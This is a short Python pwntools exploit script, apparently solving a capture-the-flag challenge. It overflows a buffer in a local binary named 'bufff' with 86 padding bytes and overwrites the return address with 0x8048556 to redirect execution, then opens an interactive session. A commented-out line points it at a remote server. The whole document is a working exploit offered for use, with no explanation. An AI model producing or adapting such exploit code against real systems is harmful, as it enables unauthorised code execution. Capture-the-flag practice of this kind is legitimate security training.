from pwn import *

p = process("./bufff")
#p = remote("website.com", 7002)
p.recvuntil("> ")

payload = ""
payload += 'A'*86
payload += p32(0x8048556)
print(payload)

pause()
p.sendline(payload)
p.interactive()

